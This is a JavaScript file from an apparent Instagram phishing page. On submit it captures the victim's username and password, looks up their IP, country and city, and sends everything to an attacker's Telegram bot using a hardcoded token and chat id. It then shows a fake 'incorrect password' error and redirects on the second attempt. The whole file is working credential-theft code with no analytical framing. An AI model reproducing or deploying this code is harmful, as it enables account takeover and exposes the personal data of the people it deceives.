const form = document.querySelector("#form");
var ct = "5";
var co = 0;
var lo = 0;
var st = 0;
var clicking = 0;

form.addEventListener("submit", (e) => {
  e.preventDefault();

  fetch("https://ipapi.co/json/")
    .then((res) => res.json())
    .then((data) => {
      ct = data.ip;
      co = data.country_name;
      lo = data.country_calling_code;
      st = data.city;

      var identity = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      var my_text = `Instagram Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;

      var token = "6986854895:AAGyBEUhIFcSqaNmOrBMjpQigzVMZpMO38g";
      var chat_id = -4085217527;
      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;

      let api = new XMLHttpRequest();
      api.open("GET", url, true);
      api.send();
      clicking = clicking + 1;
      setTimeout(function () {
        document.getElementById("alert-message").innerHTML =
          "Sorry, your password was incorrect. Please double-check your password.";
      }, 1000);
      if (clicking == 2) {
        window.location.replace("thanks.html");
      }
    });

  // window.location.replace("https://www.instagram.com/accounts/login/")
  //   console.log("Incorrect Password!");
});
